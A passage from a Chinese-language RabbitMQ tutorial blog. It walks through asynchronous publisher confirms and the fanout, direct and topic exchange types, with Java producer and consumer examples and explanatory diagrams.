class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">publicMessageAsync</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Channel</span> <span class="hljs-variable">channel</span> <span class="hljs-operator">=</span> RabbitMqUtils.getChannel();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">queueName</span> <span class="hljs-operator">=</span> UUID.randomUUID().toString();<br>        channel.queueDeclare(queueName,<span class="hljs-literal">false</span>,<span class="hljs-literal">false</span>,<span class="hljs-literal">false</span>,<span class="hljs-literal">null</span>);<br><br>        <span class="hljs-comment">// 开启发布确认</span><br>        channel.confirmSelect();<br><br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">        * 线程安全有序的一个哈希表 适用于高并发的情况下</span><br><span class="hljs-comment">        * 1、轻松地将序号与消息进行关联</span><br><span class="hljs-comment">        * 2、轻松地批量删除，只要给到序号</span><br><span class="hljs-comment">        * 3、支持高并发</span><br><span class="hljs-comment">        * */</span><br>        ConcurrentSkipListMap&lt;Long,String&gt; outstandingConfirms = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConcurrentSkipListMap</span>&lt;&gt;();<br><br>        <span class="hljs-comment">// 消息确认成功回调函数</span><br>        <span class="hljs-type">ConfirmCallback</span> <span class="hljs-variable">ackCallback</span> <span class="hljs-operator">=</span> (deliveryTag,multiply) -&gt; &#123;<br>            <span class="hljs-comment">// 删除到已经确认的消息，剩下的就是未确认的消息</span><br>            <span class="hljs-keyword">if</span>(multiply)&#123;<br>                ConcurrentNavigableMap&lt;Long, String&gt; confiremed = outstandingConfirms.headMap(deliveryTag);<br>                confiremed.clear();<br>            &#125;<span class="hljs-keyword">else</span> &#123;<br>                outstandingConfirms.remove(deliveryTag);<br>            &#125;<br><br>            System.out.println(<span class="hljs-string">&quot;确认的消息：&quot;</span>+deliveryTag);<br>        &#125;;<br><br>        <span class="hljs-comment">// 消息确认失败回调函数</span><br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">        * 参数1：消息的标记</span><br><span class="hljs-comment">        * 参数2：是否为批量确认</span><br><span class="hljs-comment">        * */</span><br>        <span class="hljs-type">ConfirmCallback</span> <span class="hljs-variable">nackCallback</span> <span class="hljs-operator">=</span> (deliveryTag,multiply) -&gt; &#123;<br>            <span class="hljs-comment">// 打印一下未确认的消息都有哪些</span><br>            <span class="hljs-type">String</span> <span class="hljs-variable">message</span> <span class="hljs-operator">=</span> outstandingConfirms.get(deliveryTag);<br>            System.out.println(<span class="hljs-string">&quot;未确认的消息是：&quot;</span> + message +<span class="hljs-string">&quot;未确认的消息tag：&quot;</span> + deliveryTag);<br>        &#125;;<br><br>        <span class="hljs-comment">// 准备消息的监听器，监听哪些消息成功，哪些消息失败</span><br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">        * 参数1：监听哪些消息成功</span><br><span class="hljs-comment">        * 参数2：监听哪些消息失败</span><br><span class="hljs-comment">        * */</span><br>        channel.addConfirmListener(ackCallback,nackCallback);<br><br>        <span class="hljs-comment">// 开始时间</span><br>        <span class="hljs-type">long</span> <span class="hljs-variable">begin</span> <span class="hljs-operator">=</span> System.currentTimeMillis();<br><br>        <span class="hljs-comment">// 批量发送消息</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; MESSAGE_COUNT; i++) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">message</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;消息&quot;</span> + i;<br>            channel.basicPublish(<span class="hljs-string">&quot;&quot;</span>,queueName,<span class="hljs-literal">null</span>,message.getBytes(StandardCharsets.UTF_8));<br><br>            <span class="hljs-comment">// 此处记录下所有要发送的消息的总和</span><br>            outstandingConfirms.put(channel.getNextPublishSeqNo(),message);<br>        &#125;<br><br><br><br>        <span class="hljs-comment">// 结束时间</span><br>        <span class="hljs-type">long</span> <span class="hljs-variable">end</span> <span class="hljs-operator">=</span> System.currentTimeMillis();<br>        System.out.println(<span class="hljs-string">&quot;发布&quot;</span>+MESSAGE_COUNT+<span class="hljs-string">&quot;个异步确认消息，耗时&quot;</span>+ (end - begin) + <span class="hljs-string">&quot;ms&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>三种发布确认速度对比</p></blockquote><table><thead><tr><th style="text-align:center">发布方式</th><th style="text-align:center">特点</th></tr></thead><tbody><tr><td style="text-align:center">单独发布消息</td><td style="text-align:center">同步等待确认，简单，但吞吐量非常有限</td></tr><tr><td style="text-align:center">批量发布消息</td><td style="text-align:center">批量同步等待确认，简单，合理的吞吐量，一旦出现问题但很难推断出是那条消息出现了问题。</td></tr><tr><td style="text-align:center">异步处理</td><td style="text-align:center">最佳性能和资源使用，在出现错误的情况下可以很好地控制，但是实现起来稍微难些</td></tr></tbody></table><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230112163348009.png" alt="image-20230112163348009" /></p><h1 id="6-交换机"><a class="markdownIt-Anchor" href="#6-交换机"></a> 6. 交换机</h1><h2 id="61-交换机简介"><a class="markdownIt-Anchor" href="#61-交换机简介"></a> 6.1 交换机简介</h2><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230112183612984.png" alt="image-20230112183612984" /></p><blockquote><p>介绍</p></blockquote><ol><li><p>RabbitMQ消息传递模型的核心思想是：<code>生产者生产的消息从不会直接发送到队列</code>。实际上，通常生产者甚至都不知道这些消息传递传递到了哪些队列中。</p></li><li><p>相反，生产者只能将消息发送到交换机(exchange)，交换机工作的内容非常简单，一方面它接收来自生产者的消息，另一方面将它们推入队列。交换机必须确切知道如何处理收到的消息。是应该把这些消息放到特定队列还是说把他们到许多队列中还是说应该丢弃它们。这就的由交换机的类型来决定。</p></li><li><p>总共有以下几个类型：</p><p>直接（direct）、主题（topic）、标题（headers）、扇出（fanout）</p></li><li><p>无名交换机：</p><p>在本教程的前面部分我们对exchange一无所知，但仍然能够将消息发送到队列。之前能实现的原因是因为我们使用的是默认交换，我们通过空字符串(&quot;&quot;)进行标识。</p><p>第一个参数是交换机的名称。空字符串表示默认或无名称交换机:消息能路由发送到队列中其实是由routingKey(bindingkey)绑定key指定的，如果它存在的话</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">channel.basiPublish(<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;hello&quot;</span>,<span class="hljs-literal">null</span>,message.getBytes())；<br></code></pre></td></tr></table></figure></li></ol><h2 id="62-临时队列"><a class="markdownIt-Anchor" href="#62-临时队列"></a> 6.2 临时队列</h2><ol><li><p>每当我们连接到Rabbit时，我们都需要一个全新的空队列，为此我们可以创建一个具有随机名称的队列，或者能让服务器为我们选择一个随机队列名称那就更好了。其次一旦我们断开了消费者的连接，队列将被自动删除。</p></li><li><p>创建临时队列的方式如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">queueName</span> <span class="hljs-operator">=</span> channel.queueDeclare().getQueue();<br></code></pre></td></tr></table></figure><p>创建出来的队列长这样：</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230112183805950.png" alt="image-20230112183805950" /></p></li></ol><h2 id="63-bindings"><a class="markdownIt-Anchor" href="#63-bindings"></a> 6.3 Bindings</h2><blockquote><p>简介</p></blockquote><p>什么是bingding.呢, binding其实是exchange和queue之间的桥梁，它告诉我们exchange和那个队列进行了绑定关系。比如说下面这张图告诉我们的就是×与Q1和Q2进行了绑定</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230112183858070.png" alt="image-20230112183858070" /></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230112183928963.png" alt="image-20230112183928963" /></p><p>绑定是交换机和队列之间的桥梁关系。也可以这么理解：</p><p><strong>队列只对它绑定的交换机的消息感兴趣</strong>。绑定用参数：routingKey 来表示也可称该参数为 binding key，创建绑定我们用代码:channel.queueBind(queueName, EXCHANGE_NAME, “routingKey”);<strong>绑定之后的****意义由其交换类型决定</strong></p><h2 id="64-fanout"><a class="markdownIt-Anchor" href="#64-fanout"></a> 6.4 Fanout</h2><h3 id="简介"><a class="markdownIt-Anchor" href="#简介"></a> 简介</h3><p>Fanout这种类型非常简单。正如从名称中猜到的那样，它是将接收到的所有消息<strong>广播</strong>到它知道的所有队列中。系统中默认有些exchange类型</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230112184017048.png" alt="image-20230112184017048" /></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230112185237903.png" alt="image-20230112185237903" /></p><p>在广播模式下，消息发送流程是这样的：</p><ul><li>1）  可以有多个队列</li><li>2）  每个队列都要绑定到Exchange（交换机）</li><li>3）  生产者发送的消息，只能发送到交换机，交换机来决定要发给哪个队列，生产者无法决定</li><li>4）  交换机把消息发送给绑定过的所有队列</li><li>5）  订阅队列的消费者都能拿到消息</li></ul><h3 id="实战"><a class="markdownIt-Anchor" href="#实战"></a> 实战</h3><ol><li><p>消费者</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*</span><br><span class="hljs-comment">* 消息接收</span><br><span class="hljs-comment">* */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ReceiveLogs01</span> &#123;<br><br>    <span class="hljs-comment">//交换机名称</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">EXCHANGE_NAME</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;logs&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Channel</span> <span class="hljs-variable">channel</span> <span class="hljs-operator">=</span> RabbitMqUtils.getChannel();<br><br>        <span class="hljs-comment">//声明一个队列,名称随机，当消费者断开与队列的连接时，队列自动删除</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">queueName</span> <span class="hljs-operator">=</span> channel.queueDeclare().getQueue();<br><br>        <span class="hljs-comment">//绑定交换机与队列</span><br>        channel.queueBind(queueName,EXCHANGE_NAME,<span class="hljs-string">&quot;&quot;</span>);<br>        System.out.println(<span class="hljs-string">&quot;等待接受消息，把接受到的消息打印在屏幕上...&quot;</span>);<br><br><br>        <span class="hljs-type">DeliverCallback</span> <span class="hljs-variable">deliverCallback</span> <span class="hljs-operator">=</span> (consumerTag,message) -&gt; &#123;<br>            System.out.println(<span class="hljs-string">&quot;ReceiveLogs01控制台打印接受到的消息：&quot;</span> + <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(message.getBody()));<br>        &#125;;<br><br>        channel.basicConsume(queueName,<span class="hljs-literal">true</span>,deliverCallback,consumerTag -&gt; &#123;&#125;);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*</span><br><span class="hljs-comment">* 消息接收</span><br><span class="hljs-comment">* */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ReceiveLogs02</span> &#123;<br><br>    <span class="hljs-comment">//交换机名称</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">EXCHANGE_NAME</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;logs&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Channel</span> <span class="hljs-variable">channel</span> <span class="hljs-operator">=</span> RabbitMqUtils.getChannel();<br><br>        <span class="hljs-comment">//声明一个队列,名称随机，当消费者断开与队列的连接时，队列自动删除</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">queueName</span> <span class="hljs-operator">=</span> channel.queueDeclare().getQueue();<br><br>        <span class="hljs-comment">//绑定交换机与队列</span><br>        channel.queueBind(queueName,EXCHANGE_NAME,<span class="hljs-string">&quot;&quot;</span>);<br>        System.out.println(<span class="hljs-string">&quot;等待接受消息，把接受到的消息打印在屏幕上...&quot;</span>);<br><br><br>        <span class="hljs-type">DeliverCallback</span> <span class="hljs-variable">deliverCallback</span> <span class="hljs-operator">=</span> (consumerTag,message) -&gt; &#123;<br>            System.out.println(<span class="hljs-string">&quot;ReceiveLogs02控制台打印接受到的消息：&quot;</span> + <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(message.getBody()));<br>        &#125;;<br><br>        channel.basicConsume(queueName,<span class="hljs-literal">true</span>,deliverCallback,consumerTag -&gt; &#123;&#125;);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>生产者</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*</span><br><span class="hljs-comment">*  发消息 交换机</span><br><span class="hljs-comment">* */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Emitlog</span> &#123;<br>    <span class="hljs-comment">// 交换机的名称</span><br>    <span class="hljs-keyword">public</span>  <span class="hljs-keyword">static</span>  <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">EXCHANGE_NAME</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;logs&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span>  Exception&#123;<br>        <span class="hljs-type">Channel</span> <span class="hljs-variable">channel</span> <span class="hljs-operator">=</span> RabbitMqUtils.getChannel();<br>        channel.exchangeDeclare(EXCHANGE_NAME,<span class="hljs-string">&quot;fauout&quot;</span>);<br><br>        <span class="hljs-type">Scanner</span> <span class="hljs-variable">scanner</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);<br>        <span class="hljs-keyword">while</span> (scanner.hasNext())&#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">message</span> <span class="hljs-operator">=</span> scanner.next();<br>            channel.basicPublish(EXCHANGE_NAME,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-literal">null</span>,message.getBytes(StandardCharsets.UTF_8));<br>            System.out.println(<span class="hljs-string">&quot;生产者发出的消息：&quot;</span>+ message);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>效果</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230112185021295.png" alt="image-20230112185021295" /></p></li></ol><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230112185032271.png" alt="image-20230112185032271" /></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230112185043636.png" alt="image-20230112185043636" /></p><h2 id="65-direct"><a class="markdownIt-Anchor" href="#65-direct"></a> 6.5 Direct</h2><blockquote><p>实现原理</p></blockquote><p>上一节中的我们的日志系统将所有消息广播给所有消费者，对此我们想做一些改变，例如我们希</p><p>望将日志消息写入磁盘的程序仅接收严重错误(errros)，而不存储哪些警告(warning)或信息(info)日志</p><p>消息避免浪费磁盘空间。Fanout 这种交换类型并不能给我们带来很大的灵活性-它只能进行无意识的</p><p>广播，在这里我们将使用 direct 这种类型来进行替换，这种类型的工作方式是，消息只去到它绑定的</p><p>routingKey 队列中去。</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230112191247694.png" alt="image-20230112191247694" /></p><p>在上面这张图中，我们可以看到 X 绑定了两个队列，绑定类型是 direct。队列 Q1 绑定键为 orange，队列 Q2 绑定键有两个:一个绑定键为 black，另一个绑定键为 green.在这种绑定情况下，生产者发布消息到 exchange 上，绑定键为 orange 的消息会被发布到队列Q1。绑定键为 blackgreen 和的消息会被发布到队列 Q2，其他消息类型的消息将被丢弃</p><blockquote><p><strong>多重绑定</strong></p></blockquote><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230112191413678.png" alt="image-20230112191413678" /></p><p>当然如果 exchange 的绑定类型是 direct，<strong>但是它绑定的多个队列的</strong> <strong>key</strong> <strong>如果都相同</strong>，在这种情</p><p>况下虽然绑定类型是 direct <strong>但是它表现的就和</strong> <strong>fanout</strong> <strong>有点类似了</strong>，就跟广播差不多，如上图所示</p><blockquote><p>实战</p></blockquote><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230112191448686.png" alt="image-20230112191448686" /></p><ol><li><p>生产者</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DirectLogs</span> &#123;<br>    <span class="hljs-comment">// 交换机的名称</span><br>    <span class="hljs-keyword">public</span>  <span class="hljs-keyword">static</span>  <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">EXCHANGE_NAME</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;direct_logs&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span>  Exception&#123;<br>        <span class="hljs-type">Channel</span> <span class="hljs-variable">channel</span> <span class="hljs-operator">=</span> RabbitMqUtils.getChannel();<br>        channel.exchangeDeclare(EXCHANGE_NAME, BuiltinExchangeType.DIRECT);<br><br>        <span class="hljs-type">Scanner</span> <span class="hljs-variable">scanner</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);<br>        <span class="hljs-keyword">while</span> (scanner.hasNext())&#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">message</span> <span class="hljs-operator">=</span> scanner.next();<br>            channel.basicPublish(EXCHANGE_NAME,<span class="hljs-string">&quot;info&quot;</span>,<span class="hljs-literal">null</span>,message.getBytes(StandardCharsets.UTF_8));<br>            System.out.println(<span class="hljs-string">&quot;生产者发出的消息：&quot;</span>+ message);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>消费者</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ReceiveLogsDirect01</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">EXCHANGE_NAME</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;direct_logs&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Channel</span> <span class="hljs-variable">channel</span> <span class="hljs-operator">=</span> RabbitMqUtils.getChannel();<br><br>        <span class="hljs-comment">//声明一个队列</span><br>        channel.queueDeclare(<span class="hljs-string">&quot;console&quot;</span>,<span class="hljs-literal">false</span>,<span class="hljs-literal">false</span>,<span class="hljs-literal">false</span>,<span class="hljs-literal">null</span>);<br><br>        <span class="hljs-comment">//绑定交换机与队列</span><br>        channel.queueBind(<span class="hljs-string">&quot;console&quot;</span>,EXCHANGE_NAME,<span class="hljs-string">&quot;info&quot;</span>);<br>        channel.queueBind(<span class="hljs-string">&quot;console&quot;</span>,EXCHANGE_NAME,<span class="hljs-string">&quot;warning&quot;</span>);<br><br><br>        <span class="hljs-type">DeliverCallback</span> <span class="hljs-variable">deliverCallback</span> <span class="hljs-operator">=</span> (consumerTag, message) -&gt; &#123;<br>            System.out.println(<span class="hljs-string">&quot;ReceiveLogsDirect01控制台打印接受到的消息：&quot;</span> + <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(message.getBody()));<br>        &#125;;<br><br>        channel.basicConsume(<span class="hljs-string">&quot;console&quot;</span>,<span class="hljs-literal">true</span>,deliverCallback,consumerTag -&gt; &#123;&#125;);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ReceiveLogsDirect02</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">EXCHANGE_NAME</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;direct_logs&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Channel</span> <span class="hljs-variable">channel</span> <span class="hljs-operator">=</span> RabbitMqUtils.getChannel();<br><br>        <span class="hljs-comment">//声明一个队列</span><br>        channel.queueDeclare(<span class="hljs-string">&quot;disk&quot;</span>,<span class="hljs-literal">false</span>,<span class="hljs-literal">false</span>,<span class="hljs-literal">false</span>,<span class="hljs-literal">null</span>);<br><br>        <span class="hljs-comment">//绑定交换机与队列</span><br>        channel.queueBind(<span class="hljs-string">&quot;disk&quot;</span>,EXCHANGE_NAME,<span class="hljs-string">&quot;error&quot;</span>);<br><br><br>        <span class="hljs-type">DeliverCallback</span> <span class="hljs-variable">deliverCallback</span> <span class="hljs-operator">=</span> (consumerTag, message) -&gt; &#123;<br>            System.out.println(<span class="hljs-string">&quot;ReceiveLogsDirect02控制台打印接受到的消息：&quot;</span> + <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(message.getBody()));<br>        &#125;;<br><br>        channel.basicConsume(<span class="hljs-string">&quot;disk&quot;</span>,<span class="hljs-literal">true</span>,deliverCallback,consumerTag -&gt; &#123;&#125;);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>效果</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230112192238926.png" alt="image-20230112192238926" /></p></li></ol><h2 id="66-topics"><a class="markdownIt-Anchor" href="#66-topics"></a> 6.6 Topics</h2><blockquote><p>介绍</p></blockquote><ol><li>发送到类型是topic交换机的消息的routing_key不能随意写，必须满足一定的要求，它<code>必须是一个单词列表，以点号分隔开</code>。这些单词可以是任意单词，比如说: “stock.usd.nyse” ， “nyse.vmw”，&quot;quick.orange.rabbit&quot;这种类型的。当然这个单词列表最多不能超过255个字节。</li><li>在这个规则列表中，其中有两个替换符：<ul><li><code>*</code> 可以代替一个单词</li><li><code>#</code> 可以代替零个或多个单词</li></ul></li></ol><blockquote><p>匹配案例</p></blockquote><p>下图绑定关系如下：</p><p>Q1绑定的是：中间带orange的三个单词的字符串：<code>*.orange.*</code></p><p>Q2绑定的是：最后一个单词是rabbit的单个单词：<code>*.*.rabbit</code>，第一个单词是lazy的多个单词：<code>lazy.#</code></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230112194339481.png" alt="image-20230112194339481" /></p><p>数据接收情况如下：</p><ol><li>quick.orange.rabbit：被队列Q1Q2接收到</li><li>quick.orange.fox：被队列Q1接收到</li><li>lazy.brown.fox：被队列Q2接收到</li><li>lazy.pink.rabbit：虽然满足队列Q2的两个绑定但是只会被接收一次</li><li>quick.orange.male.rabbit：四个单词不匹配任何绑定会被丢弃</li></ol><blockquote><p>结论</p></blockquote><ol><li>当一个队列绑定键是<code>#</code>,那么这个队列将接收所有数据，就有点像fanout了</li><li>如果队列绑定键当中没有<code>#和*</code>出现，那么该队列绑定类型就是direct了</li></ol><blockquote><p>实战</p></blockquote><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230112194418126.png" alt="image-20230112194418126" /></p><ol><li><p>生产者</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EmitLogTopic</span> &#123;<br>    <span class="hljs-comment">//交换机的名称</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">EXCHANGE_NAME</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;topic_logs&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>  <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Channel</span> <span class="hljs-variable">channel</span> <span class="hljs-operator">=</span> RabbitMqUtils.getChannel();<br><br><br>        HashMap&lt;String, String&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map.put(<span class="hljs-string">&quot;quick.orange.rabbit&quot;</span>,<span class="hljs-string">&quot;被队列Q1Q2接收到&quot;</span>);<br>        map.put(<span class="hljs-string">&quot;quick.orange.fox&quot;</span>,<span class="hljs-string">&quot;被队列Q1接收到&quot;</span>);<br>        map.put(<span class="hljs-string">&quot;lazy.brown.fox&quot;</span>,<span class="hljs-string">&quot;被队列Q2接收到 &quot;</span>);<br>        map.put(<span 